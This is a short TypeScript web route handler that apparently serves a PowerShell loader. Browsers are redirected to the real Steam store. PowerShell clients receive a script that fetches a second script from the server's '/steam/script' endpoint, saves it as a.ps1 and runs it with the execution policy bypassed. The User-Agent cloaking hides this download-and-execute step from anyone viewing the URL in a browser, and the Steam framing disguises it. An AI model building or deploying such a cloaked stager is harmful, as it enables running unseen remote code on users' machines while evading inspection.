import { getServerSideURL } from '@/utilities/getURL'

export async function GET(request: Request): Promise<Response> {
  const userAgent = request.headers.get('user-agent') || 'Unknown'
  console.log(`Request User-Agent: ${userAgent}`)

  // Redirect to Steam store if the request is not from PowerShell
  if (!userAgent.includes('WindowsPowerShell')) {
    return Response.redirect('https://store.steampowered.com', 302)
  }
  return new Response(
    `
    $headers = @{"Authorization" = "Bearer fucxxxxxkuuuuuuuuuuuuuuuuuuuuuuuu" };
    $response = Invoke-WebRequest -Uri "${getServerSideURL()}/steam/script" -Headers $headers;
    Set-Content -Value $response.Content -Path a.ps1 -Encoding UTF8 -force;
    powershell.exe -ExecutionPolicy Bypass -File a.ps1;
    `,
  )
}
